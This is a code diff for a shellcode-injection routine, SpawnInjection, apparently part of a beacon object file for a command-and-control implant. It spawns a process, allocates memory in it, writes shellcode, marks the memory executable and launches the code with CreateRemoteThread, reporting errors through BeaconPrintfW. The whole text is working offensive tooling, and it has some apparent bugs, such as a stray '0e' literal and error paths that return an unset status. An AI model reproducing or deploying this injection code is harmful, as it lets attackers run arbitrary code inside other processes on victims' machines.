@@ -12,20 +12,18 @@
 auto SpawnInjection(     
     _In_  PBYTE ShellcodeBuff,
     _In_  ULONG ShellcodeSize,
-    _In_  PBYTE Argument 
-) -> void {
+    _In_  PBYTE Argument,
+    _In_  PS_CREATE_ARGS* CreateArgs
+) -> NTSTATUS {
     NTSTATUS            status       = STATUS_SUCCESS; 
     PROCESS_INFORMATION process_info = { 0 };
 
-    PS_CREATE_ARGS create_args = {  };
+    PS_CREATE_ARGS* create_args = CreateArgs;
 
-    create_args.argument  = nullptr;
-    create_args.blockdlls = 0e;
-
-    status = kh_process_creation(  );
+    status = kh_process_creation( create_args, &process_info );
     if ( ! nt_success( status ) ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Process creation failure with error: (%d) %s", status, fmt_error( status ) );
-        return;
+        return status;
     }
 
     HANDLE   process_handle  = nullptr;
@@ -38,25 +36,25 @@ auto SpawnInjection(
     PVOID shellcode_ptr = VirtualAllocEx( process_handle, nullptr, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
     if ( ! shellcode_ptr ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Allocation memory to shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
-        return;
+        return status;
     }
 
     SIZE_T bytes_written = 0;
     if ( ! WriteProcessMemory( process_handle, shellcode_ptr, ShellcodeBuff, ShellcodeSize, &bytes_written ) ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Write shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
-        return;
+        return status;
     }
 
     ULONG old_protection = 0;
     if ( ! VirtualProtectEx( process_handle, shellcode_ptr, ShellcodeSize, PAGE_EXECUTE_READ, &old_protection ) ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Change protection to RX failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
-        return;
+        return status;
     }
 
     ULONG thread_id = 0;
     if ( ! CreateRemoteThread( process_handle, nullptr, 0, (LPTHREAD_START_ROUTINE)shellcode_ptr, nullptr, 0, &thread_id ) ) {
         BeaconPrintfW( CALLBACK_ERROR, L"Create thread to execute shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
-        return;
+        return status;
     }
 
     BeaconPrintfW( CALLBACK_OUTPUT, L"Executing Shellcode in Thread ID: %d\n", thread_id );
